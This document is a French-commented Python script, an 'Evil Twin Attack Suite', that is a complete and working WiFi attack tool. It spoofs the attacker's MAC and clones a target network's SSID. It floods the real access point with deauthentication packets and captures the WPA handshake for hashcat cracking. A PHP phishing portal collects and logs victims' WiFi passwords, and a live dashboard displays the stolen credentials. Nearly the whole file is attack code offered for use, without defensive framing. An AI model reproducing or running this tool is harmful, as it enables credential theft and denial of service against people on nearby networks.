#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
EVIL TWIN ATTACK SUITE - ULTIMATE EDITION v4.0
-------------------------------------------------------------
Fonctionnalités :
- Fenêtres Xterm en temps réel (déauth + capture) 
- Capture handshake avec vérification automatique
- Nettoyage wpaclean + conversion hcxpcapngtool → hash 22000
- Monitoring en temps réel des clients et crédentials
- Support 2.4GHz / 5GHz (Alfa AWUS036ACH)
- Furtivité : MAC spoofing, HTTPS, désactivation power save
- Auto-réparation des services

AUTEUR : 
VERSION : 4.0
"""

import os
import sys
import time
import signal
import subprocess
import tempfile
import shutil
import re
import threading
import json
import random
from typing import List, Tuple, Optional, Dict

# ========== CONSTANTES ==========
INTERFACE = None
MON_INTERFACE = None
TARGET_BSSID = None
TARGET_ESSID = None
TARGET_CHANNEL = None
TARGET_BAND = None
PHISHING_DIR = None
CAPTURE_FILE = None
CLEANED_CAP = None
HASH_FILE = None
LOG_FILE = "/tmp/evil_twin.log"
HOSTAPD_CONF_PATH = None
DNSMASQ_CONF_PATH = None
DHCP_LEASE = "/tmp/evil_twin.leases"
CRED_FILE = "/tmp/evil_twin_creds.json"
ORIGINAL_MAC = None
RUNNING = True
HANDSHAKE_CAPTURED = False

# PIDs
HOSTAPD_PID = None
DNSMASQ_PID = None
WEB_PID = None
AIRODUMP_PID = None
DEAUTH_PID = None
MDK_PID = None
XTERM_DEAUTH_PID = None
XTERM_CAPTURE_PID = None

# ========== UTILITAIRES ==========
def log(msg: str, color: str = ""):
    if color:
        print(f"{color}[{time.strftime('%H:%M:%S')}] {msg}{'\033[0m'}")
    else:
        print(f"[{time.strftime('%H:%M:%S')}] {msg}")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")

def error(msg: str):
    log(f"ERROR: {msg}", "\033[91m")
    sys.exit(1)

def success(msg: str):
    log(msg, "\033[92m")

def warning(msg: str):
    log(msg, "\033[93m")

def check_root():
    if os.geteuid() != 0:
        error("Ce script doit être exécuté en root.")

def check_deps():
    deps = ["airmon-ng", "airodump-ng", "aireplay-ng", "hostapd", "dnsmasq", 
            "iptables", "php", "openssl", "macchanger", "xterm", "wpaclean"]
    missing = []
    for dep in deps:
        if shutil.which(dep) is None:
            missing.append(dep)
    if missing:
        error(f"Dépendances manquantes: {', '.join(missing)}\nInstallez: apt-get install {' '.join(missing)} -y")
    # hcxpcapngtool (hcxtools)
    if shutil.which("hcxpcapngtool") is None:
        warning("hcxpcapngtool non trouvé. Installez: apt-get install hcxtools -y")
    if shutil.which("mdk4") is None:
        warning("mdk4 non trouvé (optionnel): apt-get install mdk4 -y")
    if shutil.which("aircrack-ng") is None:
        error("aircrack-ng requis pour la vérification du handshake.")

# ========== INTERFACE ==========
def select_interface() -> str:
    interfaces = []
    try:
        output = subprocess.check_output(["iwconfig"], stderr=subprocess.DEVNULL).decode()
        for line in output.splitlines():
            if line and not line.startswith(" "):
                iface = line.split()[0]
                if iface.startswith(("wlan", "eth", "wl")):
                    interfaces.append(iface)
    except:
        pass
    if not interfaces:
        error("Aucune interface sans-fil trouvée.")
    print("\nInterfaces disponibles:")
    for i, iface in enumerate(interfaces, 1):
        print(f"  {i}. {iface}")
    while True:
        choice = input("Sélectionnez le numéro (ou le nom): ").strip()
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(interfaces):
                return interfaces[idx]
        else:
            if choice in interfaces:
                return choice
        print("Choix invalide.")

def enable_monitor(iface: str) -> str:
    global ORIGINAL_MAC
    log("Kill des processus interférents...")
    subprocess.call(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    log(f"Activation du mode monitor sur {iface}...")
    try:
        ORIGINAL_MAC = subprocess.check_output(["cat", f"/sys/class/net/{iface}/address"]).decode().strip()
        log(f"MAC originale: {ORIGINAL_MAC}")
    except:
        ORIGINAL_MAC = None
    # MAC aléatoire pour furtivité
    subprocess.call(["ip", "link", "set", iface, "down"], stderr=subprocess.DEVNULL)
    subprocess.call(["macchanger", "-r", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call(["ip", "link", "set", iface, "up"], stderr=subprocess.DEVNULL)
    success("MAC changée aléatoirement.")
    try:
        proc = subprocess.Popen(["airmon-ng", "start", iface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, _ = proc.communicate()
        output = stdout.decode()
        mon_iface = None
        for line in output.splitlines(): 
            if "mon" in line and "enabled" not in line and "monitor" not in line:
                parts = line.split()
                for part in parts:
                    if "mon" in part and not part.endswith(":"):
                        mon_iface = part.strip()
                        break
                if mon_iface:
                    break
        if not mon_iface:
            possible = [iface + "mon", "mon0", "mon1"]
            for p in possible:
                if os.path.exists(f"/sys/class/net/{p}"):
                    mon_iface = p
                    break
        if not mon_iface:
            mon_iface = iface + "mon"
            subprocess.call(["iw", "dev", iface, "interface", "add", mon_iface, "type", "monitor"],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.call(["ip", "link", "set", mon_iface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if not os.path.exists(f"/sys/class/net/{mon_iface}"):
            error(f"Interface monitor {mon_iface} non créée.")
        # Désactivation power save pour performance
        subprocess.call(["iw", "dev", mon_iface, "set", "power_save", "off"], stderr=subprocess.DEVNULL)
        success(f"Interface monitor: {mon_iface}")
        return mon_iface
    except Exception as e:
        error(f"Échec activation monitor: {e}")

# ========== SCAN ==========
def scan_networks(mon_iface: str) -> List[Tuple[str, str, str, str, str]]:
    log("Scan des réseaux WiFi (30s)...")
    temp_dir = tempfile.mkdtemp(prefix="scan_")
    prefix = os.path.join(temp_dir, "scan")
    csv_file = prefix + "-01.csv"
    cmd = ["airodump-ng", "--band", "abg", mon_iface, "-w", prefix, "--output-format", "csv"]
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(5)
    for _ in range(30):
        if os.path.exists(csv_file) and os.path.getsize(csv_file) > 0:
            break
        time.sleep(1)
    proc.terminate()
    time.sleep(2)
    proc.kill()

    networks = []
    if not os.path.exists(csv_file):
        error("Fichier de scan non créé. Vérifiez le mode monitor.")

    try:
        with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
        in_stations = False
        for line in lines:
            if "Station MAC" in line:
                in_stations = True
                continue
            if in_stations:
                break
            if line.strip() and not line.startswith("BSSID"):
                parts = line.split(",")
                if len(parts) >= 7 and parts[0].strip():
                    bssid = parts[0].strip()
                    essid = parts[13].strip() if len(parts) > 13 else ""
                    channel = parts[3].strip()
                    encryption = parts[5].strip()
                    try:
                        ch = int(channel)
                        band = 'a' if ch > 14 else 'g'
                    except:
                        band = 'g'
                    if essid and essid != "":
                        networks.append((bssid, essid, channel, encryption, band))
    except Exception as e:
        error(f"Erreur parsing scan: {e}")
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)

    if not networks:
        error("Aucun réseau trouvé.")
    return networks

def display_networks(networks: List[Tuple[str, str, str, str, str]]):
    print("\n" + "=" * 90)
    print(f"{'#':<4} {'BSSID':<18} {'CH':<4} {'Bande':<6} {'ENC':<12} {'ESSID'}")
    print("-" * 90)
    for i, (bssid, essid, channel, enc, band) in enumerate(networks, 1):
        print(f"{i:<4} {bssid:<18} {channel:<4} {band:<6} {enc[:12]:<12} {essid}")
    print("=" * 90)

def select_target(networks: List[Tuple[str, str, str, str, str]]) -> Tuple[str, str, str, str]:
    while True:
        choice = input("Entrez le numéro ou BSSID: ").strip()
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(networks):
                bssid, essid, channel, enc, band = networks[idx]
                return bssid, essid, channel, band
        else:
            for bssid, essid, channel, enc, band in networks:
                if choice.lower() == bssid.lower():
                    return bssid, essid, channel, band
        print("Choix invalide.")

# ========== PHISHING PORTAL ==========
def generate_phishing_portal(essid: str) -> str:
    dir_path = tempfile.mkdtemp(prefix="evil_twin_")
    ssl_cert = "/tmp/evil_twin_cert.pem"
    subprocess.call(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
                     "-keyout", ssl_cert, "-out", ssl_cert,
                     "-days", "1", "-subj", "/CN=evil-twin"], 
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    index_path = os.path.join(dir_path, "index.php")
    with open(index_path, "w") as f:
        f.write(f'''<?php
$logfile = "{CRED_FILE}";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {{
    $pass = $_POST['password'];
    if (!empty($pass)) {{
        $entry = [
            'time' => date('Y-m-d H:i:s'),
            'password' => $pass,
            'ip' => $_SERVER['REMOTE_ADDR'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
        ];
        if (file_exists($logfile)) {{
            $data = json_decode(file_get_contents($logfile), true);
            if (!is_array($data)) $data = [];
        }} else {{
            $data = [];
        }}
        $data[] = $entry;
        file_put_contents($logfile, json_encode($data, JSON_PRETTY_PRINT));
        echo "<!DOCTYPE html><html><head><title>Connecté</title><style>body{{background:#1e1e2f;color:#fff;font-family:sans-serif;text-align:center;padding-top:10%;}}</style></head><body><h1 style='color:#4caf50;'>✓ Authentification réussie</h1><p>Redirection en cours...</p><script>setTimeout(function(){{window.location.href='https://www.google.com';}},2000);</script></body></html>";
        exit;
    }}
}}
?>
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login - <?php echo htmlspecialchars($_GET['ssid'] ?? '{essid}'); ?></title>
    <style>
        body {{ background: #121212; color: #e0e0e0; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
        .box {{ background: #1e1e2f; padding: 40px; border-radius: 16px; box-shadow: 0 0 30px #000; width: 320px; text-align: center; }}
        input {{ width: 100%; padding: 12px; margin: 10px 0; background: #2a2a3a; border: 1px solid #3a3a5a; border-radius: 8px; color: #fff; font-size: 16px; }}
        button {{ width: 100%; padding: 12px; background: #4caf50; border: none; border-radius: 8px; font-weight: bold; color: #000; font-size: 16px; cursor: pointer; }}
        button:hover {{ background: #66bb6a; }}
        .logo {{ font-size: 48px; margin-bottom: 10px; }}
        .note {{ font-size: 12px; color: #666; margin-top: 20px; }}
    </style>
</head>
<body>
<div class="box">
    <div class="logo"></div>
    <h2>Login à <?php echo htmlspecialchars($_GET['ssid'] ?? '{essid}'); ?></h2>
    <p style="color:#aaa;">Entrez le mot de passe pour continuer</p>
    <form method="POST">
        <input type="password" name="password" placeholder="Mot de passe WiFi" required autofocus>
        <button type="submit">Se connecter</button>
    </form>
    <p class="note">Connexion sécurisée • WPA2-Enterprise</p>
</div>
</body>
</html>
''')
    return dir_path

# ========== SERVICES ==========
def start_hostapd(mon_iface: str, essid: str, channel: str, band: str):
    global HOSTAPD_PID, HOSTAPD_CONF_PATH
    tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".conf", delete=False)
    HOSTAPD_CONF_PATH = tmp.name
    hw_mode = 'a' if band == 'a' else 'g'
    extra = ""
    if band == 'a':
        extra = f"ieee80211ac=1\nvht_oper_chwidth=1\nvht_oper_centr_freq_seg0_idx={int(channel)+2}"
    tmp.write(f"""interface={mon_iface}
driver=nl80211
ssid={essid}
hw_mode={hw_mode}
channel={channel}
{extra}
wpa=2
wpa_passphrase=00000000
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
auth_algs=1
macaddr_acl=0
ignore_broadcast_ssid=0
""")
    tmp.close()
    log(f"Démarrage hostapd sur {mon_iface} (SSID: {essid}, canal: {channel}, bande: {band})")
    proc = subprocess.Popen(["hostapd", HOSTAPD_CONF_PATH, "-B"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    HOSTAPD_PID = proc.pid
    time.sleep(3)
    if subprocess.call(["pgrep", "-x", "hostapd"], stdout=subprocess.DEVNULL) == 0:
        success("hostapd démarré.")
    else:
        error("Échec de hostapd.")

def start_dnsmasq(mon_iface: str):
    global DNSMASQ_PID, DNSMASQ_CONF_PATH
    tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".conf", delete=False)
    DNSMASQ_CONF_PATH = tmp.name
    tmp.write(f"""interface={mon_iface}
dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,8.8.8.8,1.1.1.1
server=8.8.8.8
server=1.1.1.1
address=/#/192.168.1.1
log-queries
log-dhcp
dhcp-leasefile={DHCP_LEASE}
""")
    tmp.close()
    log("Démarrage dnsmasq")
    proc = subprocess.Popen(["dnsmasq", "-C", DNSMASQ_CONF_PATH, "--no-daemon"],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    DNSMASQ_PID = proc.pid
    time.sleep(2)
    success("dnsmasq démarré.")

def start_web_server(phishing_dir: str):
    global WEB_PID
    log("Démarrage serveur web PHP (HTTP:80, HTTPS:443)")
    proc_http = subprocess.Popen(["php", "-S", "192.168.1.1:80", "-t", phishing_dir],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ssl_cert = "/tmp/evil_twin_cert.pem"
    proc_https = subprocess.Popen(["php", "-S", "192.168.1.1:443", "-t", phishing_dir,
                                   "-d", "session.auto_start=0"],
                                  env=dict(os.environ, SSL_CERT_FILE=ssl_cert),
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    WEB_PID = proc_https.pid
    time.sleep(2)
    success("Serveurs web démarrés.")

def setup_iptables(mon_iface: str):
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")
    subprocess.call(["iptables", "-t", "nat", "-F"])
    subprocess.call(["iptables", "-F"])
    subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", mon_iface, "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "192.168.1.1:80"])
    subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", mon_iface, "-p", "tcp", "--dport", "443", "-j", "DNAT", "--to-destination", "192.168.1.1:443"])
    subprocess.call(["iptables", "-A", "FORWARD", "-i", mon_iface, "-j", "ACCEPT"])
    subprocess.call(["iptables", "-A", "FORWARD", "-o", mon_iface, "-j", "ACCEPT"])
    for out_iface in ["eth0", "wlan0"]:
        if os.path.exists(f"/sys/class/net/{out_iface}"):
            subprocess.call(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", out_iface, "-j", "MASQUERADE"])
            break
    success("iptables appliquées.")

# ========== ATTAQUES AVEC FENÊTRES XTERM ==========
def start_deauth_xterm(mon_iface: str, bssid: str, channel: str):
    """Lance la déauth dans une fenêtre Xterm visible (comme airgeddon)"""
    global XTERM_DEAUTH_PID
    log("Lancement de la déauth dans une fenêtre Xterm...")
    
    # Commande avec mdk4 (plus agressif) + aireplay en arrière-plan
    cmd = f"mdk4 {mon_iface} d -b {bssid} -c {channel} 2>&1 | tee /tmp/deauth.log"
    # On lance aussi aireplay-ng en parallèle via un autre xterm
    cmd2 = f"aireplay-ng --deauth 0 -a {bssid} --ignore-negative-one {mon_iface} 2>&1 | tee -a /tmp/deauth.log"
    
    # Fenêtre 1: mdk4
    proc1 = subprocess.Popen(["xterm", "-bg", "#000000", "-fg", "#FF0000", 
                              "-geometry", "80x20+0+0", 
                              "-T", "MDK4 Deauth Attack [REALTIME]",
                              "-e", "bash", "-c", cmd],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # Fenêtre 2: aireplay-ng
    proc2 = subprocess.Popen(["xterm", "-bg", "#000000", "-fg", "#FF6600",
                              "-geometry", "80x20+0+200",
                              "-T", "Aireplay-ng Deauth [REALTIME]",
                              "-e", "bash", "-c", cmd2],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    XTERM_DEAUTH_PID = proc1.pid
    success("Fenêtres Xterm de déauth ouvertes (MDK4 + Aireplay).")

def start_capture_xterm(mon_iface: str, bssid: str, channel: str, cap_file: str):
    """Lance airodump-ng dans une fenêtre Xterm visible"""
    global XTERM_CAPTURE_PID
    log("Lancement de la capture handshake dans une fenêtre Xterm...")
    
    cmd = f"airodump-ng -c {channel} --bssid {bssid} -w {cap_file} {mon_iface} 2>&1 | tee /tmp/capture.log"
    proc = subprocess.Popen(["xterm", "-bg", "#000000", "-fg", "#00FF00",
                             "-geometry", "80x20+0+400",
                             "-T", "Handshake Capture [REALTIME]",
                             "-e", "bash", "-c", cmd],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    XTERM_CAPTURE_PID = proc.pid
    success("Fenêtre Xterm de capture ouverte.")

# ========== HAND SHAKE VERIFICATION & CONVERSION ==========
def check_handshake(cap_file: str, bssid: str) -> bool:
    """Vérifie si le handshake est présent dans le fichier .cap"""
    cap_path = cap_file + "-01.cap"
    if not os.path.exists(cap_path):
        return False
    try:
        output = subprocess.check_output(["aircrack-ng", "-a", "2", "-b", bssid, cap_path],
                                         stderr=subprocess.DEVNULL).decode()
        if "1 handshake" in output:
            return True
    except:
        pass
    return False

def wait_for_handshake(cap_file: str, bssid: str, timeout: int = 180):
    """Attend le handshake avec affichage en direct"""
    global HANDSHAKE_CAPTURED
    cap_path = cap_file + "-01.cap"
    log(f"Attente du handshake (timeout: {timeout}s)...")
    start_time = time.time()
    last_check = 0
    
    while time.time() - start_time < timeout:
        if os.path.exists(cap_path) and os.path.getsize(cap_path) > 0:
            # Vérification toutes les 5s
            if time.time() - last_check > 5:
                if check_handshake(cap_file, bssid):
                    success("✓ HANDSHAKE CAPTURÉ !")
                    HANDSHAKE_CAPTURED = True
                    return True
                last_check = time.time()
        # Affichage de progression toutes les 10s
        if int(time.time() - start_time) % 10 == 0 and int(time.time() - start_time) > 0:
            elapsed = int(time.time() - start_time)
            if os.path.exists(cap_path):
                size = os.path.getsize(cap_path)
                print(f"  [Attente] {elapsed}s écoulées - fichier: {size} octets")
            else:
                print(f"  [Attente] {elapsed}s écoulées - fichier non créé")
        time.sleep(1)
    
    warning("⏱ Handshake non capturé dans le délai imparti.")
    return False

def clean_and_convert_handshake(cap_file: str, bssid: str) -> Tuple[Optional[str], Optional[str]]:
    """
    Nettoie le fichier .cap avec wpaclean et le convertit en hash 22000
    Retourne (cleaned_cap_path, hash_path)
    """
    global CLEANED_CAP, HASH_FILE
    
    input_cap = cap_file + "-01.cap"
    if not os.path.exists(input_cap):
        warning(f"Fichier {input_cap} introuvable.")
        return None, None
    
    # 1. Nettoyage avec wpaclean
    cleaned_path = f"/tmp/handshake_cleaned_{int(time.time())}.cap"
    log(f"Nettoyage du handshake avec wpaclean...")
    try:
        subprocess.call(["wpaclean", cleaned_path, input_cap],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if os.path.exists(cleaned_path) and os.path.getsize(cleaned_path) > 0:
            success(f"✓ Nettoyage wpaclean réussi: {cleaned_path}")
            CLEANED_CAP = cleaned_path
        else:
            warning("Échec du nettoyage wpaclean, utilisation du fichier original.")
            cleaned_path = input_cap
            CLEANED_CAP = input_cap
    except Exception as e:
        warning(f"wpaclean a échoué: {e}, utilisation du fichier original.")
        cleaned_path = input_cap
        CLEANED_CAP = input_cap
    
    # 2. Conversion en hash 22000 avec hcxpcapngtool
    hash_path = f"/tmp/handshake_hash_{int(time.time())}.22000"
    log(f"Conversion en hash 22000 avec hcxpcapngtool...")
    try:
        if shutil.which("hcxpcapngtool"):
            subprocess.call(["hcxpcapngtool", "-o", hash_path, cleaned_path],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if os.path.exists(hash_path) and os.path.getsize(hash_path) > 0:
                success(f"✓ Conversion hash réussie: {hash_path}")
                HASH_FILE = hash_path
                # Afficher le contenu du hash
                with open(hash_path, "r") as f:
                    content = f.read().strip()
                    print("\n" + "=" * 60)
                    print("HASH 22000 (pour Hashcat):")
                    print("-" * 60)
                    print(content[:200] + "..." if len(content) > 200 else content)
                    print("=" * 60)
                return cleaned_path, hash_path
            else:
                warning("Échec de la conversion hcxpcapngtool.")
                return cleaned_path, None
        else:
            warning("hcxpcapngtool non installé. Installez hcxtools.")
            return cleaned_path, None
    except Exception as e:
        warning(f"Erreur conversion: {e}")
        return cleaned_path, None

# ========== MONITORING ==========
def monitor_clients():
    """Monitoring en temps réel"""
    global RUNNING
    log("Démarrage du moniteur...")
    while RUNNING:
        os.system('clear')
        print("\033[92m" + "=" * 80 + "\033[0m")
        print("\033[96m[!] EVIL TWIN ATTACK - TABLEAU DE BORD EN TEMPS RÉEL\033[0m")
        print(f"  Cible: {TARGET_ESSID} ({TARGET_BSSID}) - Canal {TARGET_CHANNEL} ({TARGET_BAND})")
        print(f"  Interface: {MON_INTERFACE}")
        print(f"  Handshake capturé: {' OUI' if HANDSHAKE_CAPTURED else '⏳ EN ATTENTE'}")
        print(f"  Heure: {time.strftime('%H:%M:%S')}")
        print("-" * 80)
        
        # Clients connectés (depuis airodump via le fichier)
        try:
            # On extrait les clients depuis la sortie de airodump
            if os.path.exists("/tmp/capture.log"):
                with open("/tmp/capture.log", "r") as f:
                    lines = f.readlines()[-50:]  # dernières lignes
                print("\033[93mClients détectés:\033[0m")
                found = False
                for line in lines:
                    if "Station" in line or "BSSID" in line:
                        continue
                    if ":" in line and len(line.split()) > 2:
                        parts = line.split()
                        if len(parts) >= 3:
                            print(f"  {parts[0]}  (Puissance: {parts[2]} dBm)")
                            found = True
                if not found:
                    print("  Aucun client visible")
        except:
            print("  Aucun client visible")
        
        # Crédentials capturés
        if os.path.exists(CRED_FILE):
            try:
                with open(CRED_FILE, "r") as f:
                    data = json.load(f)
                if data:
                    print("\n\033[92mMots de passe capturés:\033[0m")
                    for entry in data[-5:]:
                        print(f"  {entry['time']} - {entry['password']} (IP: {entry['ip']})")
                else:
                    print("\nAucun mot de passe capturé.")
            except:
                pass
        else:
            print("\nAucun mot de passe capturé.")
        
        # Infos fichiers
        print("-" * 80)
        if CLEANED_CAP:
            print(f"  Fichier .cap nettoyé: {CLEANED_CAP}")
        if HASH_FILE:
            print(f"  Fichier hash 22000: {HASH_FILE}")
        print("\n  [Ctrl+C] pour arrêter l'attaque et nettoyer")
        time.sleep(3)

# ========== NETTOYAGE ==========
def cleanup(signum=None, frame=None):
    global RUNNING
    RUNNING = False
    log("Nettoyage en cours...")
    
    # Kill Xterm
    for pid in [XTERM_DEAUTH_PID, XTERM_CAPTURE_PID]:
        if pid:
            try:
                os.kill(pid, signal.SIGTERM)
            except:
                pass
    
    # Kill processus
    for pid_var in ["HOSTAPD_PID", "DNSMASQ_PID", "WEB_PID", "AIRODUMP_PID", "DEAUTH_PID", "MDK_PID"]:
        pid = globals().get(pid_var)
        if pid:
            try:
                os.kill(pid, signal.SIGTERM)
            except:
                pass
    
    subprocess.call(["pkill", "-f", "hostapd"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call(["pkill", "-f", "dnsmasq"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call(["pkill", "-f", "php"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call(["pkill", "-f", "aireplay-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call(["pkill", "-f", "mdk4"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call(["pkill", "-f", "airodump-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call(["pkill", "-f", "xterm"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Iptables
    subprocess.call(["iptables", "-t", "nat", "-F"])
    subprocess.call(["iptables", "-F"])
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("0")
    
    # Monitor
    if MON_INTERFACE:
        subprocess.call(["airmon-ng", "stop", MON_INTERFACE], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.call(["ip", "link", "set", MON_INTERFACE, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.call(["iw", "dev", MON_INTERFACE, "del"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # MAC restore
    if INTERFACE and ORIGINAL_MAC:
        subprocess.call(["ip", "link", "set", INTERFACE, "down"], stderr=subprocess.DEVNULL)
        subprocess.call(["macchanger", "-m", ORIGINAL_MAC, INTERFACE], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.call(["ip", "link", "set", INTERFACE, "up"], stderr=subprocess.DEVNULL)
    
    # Fichiers temporaires
    for fpath in [HOSTAPD_CONF_PATH, DNSMASQ_CONF_PATH]:
        if fpath and os.path.exists(fpath):
            try:
                os.unlink(fpath)
            except:
                pass
    
    if CAPTURE_FILE:
        for ext in ["-01.cap", "-01.kismet.csv"]:
            try:
                os.unlink(CAPTURE_FILE + ext)
            except:
                pass
    
    if PHISHING_DIR and os.path.exists(PHISHING_DIR):
        shutil.rmtree(PHISHING_DIR, ignore_errors=True)
    
    log("Nettoyage terminé.")
    sys.exit(0)

# ========== MAIN ==========
def main():
    global INTERFACE, MON_INTERFACE, TARGET_BSSID, TARGET_ESSID, TARGET_CHANNEL, TARGET_BAND, PHISHING_DIR, CAPTURE_FILE
    global MONITOR_THREAD
    
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)
    
    check_root()
    check_deps()
    
    INTERFACE = select_interface()
    MON_INTERFACE = enable_monitor(INTERFACE)
    
    networks = scan_networks(MON_INTERFACE)
    display_networks(networks)
    TARGET_BSSID, TARGET_ESSID, TARGET_CHANNEL, TARGET_BAND = select_target(networks)
    log(f"Cible: {TARGET_ESSID} ({TARGET_BSSID}) canal {TARGET_CHANNEL} ({TARGET_BAND})")
    
    # 1. Préparation du phishing
    PHISHING_DIR = generate_phishing_portal(TARGET_ESSID)
    
    # 2. Configuration IP
    subprocess.call(["ip", "addr", "add", "192.168.1.1/24", "dev", MON_INTERFACE], stderr=subprocess.DEVNULL)
    subprocess.call(["ip", "link", "set", MON_INTERFACE, "up"])
    
    # 3. Services
    setup_iptables(MON_INTERFACE)
    start_dnsmasq(MON_INTERFACE)
    start_hostapd(MON_INTERFACE, TARGET_ESSID, TARGET_CHANNEL, TARGET_BAND)
    start_web_server(PHISHING_DIR)
    
    # 4. Attaques avec fenêtres Xterm (comme airgeddon)
    CAPTURE_FILE = tempfile.NamedTemporaryFile(prefix="handshake_", suffix=".cap", delete=False).name
    start_deauth_xterm(MON_INTERFACE, TARGET_BSSID, TARGET_CHANNEL)
    start_capture_xterm(MON_INTERFACE, TARGET_BSSID, TARGET_CHANNEL, CAPTURE_FILE)
    
    # 5. Attente du handshake
    handshake_ok = wait_for_handshake(CAPTURE_FILE, TARGET_BSSID)
    
    # 6. Si handshake capturé → nettoyage + conversion hash
    if handshake_ok:
        success(" HANDSHAKE CAPTURÉ AVEC SUCCÈS !")
        cleaned, hash_file = clean_and_convert_handshake(CAPTURE_FILE, TARGET_BSSID)
        if hash_file:
            print("\n" + "=" * 60)
            print(" RÉSUMÉ DES FICHIERS GÉNÉRÉS:")
            print(f"  - Handshake brut: {CAPTURE_FILE}-01.cap")
            print(f"  - Handshake nettoyé: {cleaned}")
            print(f"  - Hash 22000: {hash_file}")
            print("\n  Commande Hashcat pour cracker:")
            print(f"  hashcat -m 22000 {hash_file} /usr/share/wordlists/rockyou.txt")
            print("=" * 60)
    else:
        warning("⚠ Handshake non capturé. L'attaque phishing continue.")
    
    # 7. Monitoring en temps réel
    MONITOR_THREAD = threading.Thread(target=monitor_clients, daemon=True)
    MONITOR_THREAD.start()
    
    print("\n" + "=" * 60)
    print(" EVIL TWIN ATTACK EN COURS")
    print("  - Portail phishing: http://192.168.1.1 (HTTPS:443)")
    print(f"  - Mots de passe: {CRED_FILE}")
    print("  - Fenêtres Xterm: déauth + capture en temps réel")
    print("  - Appuyez sur Ctrl+C pour arrêter")
    print("=" * 60)
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        cleanup()

if __name__ == "__main__":
    main() 
